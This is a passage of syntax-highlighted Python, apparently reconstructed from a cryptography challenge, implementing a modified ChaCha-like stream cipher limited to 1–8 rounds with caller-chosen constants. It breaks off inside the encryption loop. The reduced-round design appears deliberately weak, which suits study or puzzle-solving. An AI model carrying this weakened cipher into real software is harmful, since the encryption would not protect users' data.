&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;make_block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nonce_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_constants_tuple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds_to_execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    Generates one 64-byte block of bits, allowing control over the&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    number of rounds executed.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# inserted
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ValueError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Key must be 32 bytes&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nonce_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ValueError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Nonce must be 12 bytes&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds_to_execute&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ValueError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;rounds_to_execute must be between 1 and 8 for this modified version.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_constants_tuple&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;key_words&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bytes_to_words&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;nonce_words&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bytes_to_words&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nonce_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ValueError&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ValueError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Error converting key/nonce to words: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key_words&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter_int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4294967295&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nonce_words&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;initial_state_snapshot&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qr_operations_sequence&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mix_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mix_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mix_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mix_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mix_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mix_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mix_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mix_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rounds_to_execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;qr_operations_sequence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initial_state_snapshot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;words_to_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zeros&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nonce_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initial_counter_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_constants_tuple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds_to_execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    Encrypts or decrypts data using a mysterious cipher.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    The num_double_rounds parameter is implicitly 1 (one application of the round structure),&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    with the actual mixing controlled by rounds_to_execute.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# inserted
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#print(&quot;get_bytes&quot;, hexlify(key_bytes), hexlify(nonce_bytes), initial_counter_int, hexlify(data_bytes), current_constants_tuple, rounds_to_execute)
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;output_byte_array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;current_counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initial_counter_int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4294967295&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;data_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;block_idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;block_idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;keystream_block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;make_block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nonce_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_constants_tuple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds_to_execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rounds_to_execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Error in make_block during stream processing for counter &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_counter&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;#1 print(&quot;make_block&quot;, block_idx, hexlify(keystream_block))
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;remaining_data_in_block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;block_idx&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;chunk_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remaining_data_in_block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunk_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;output_byte_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block_idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keystream_block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;block_idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;
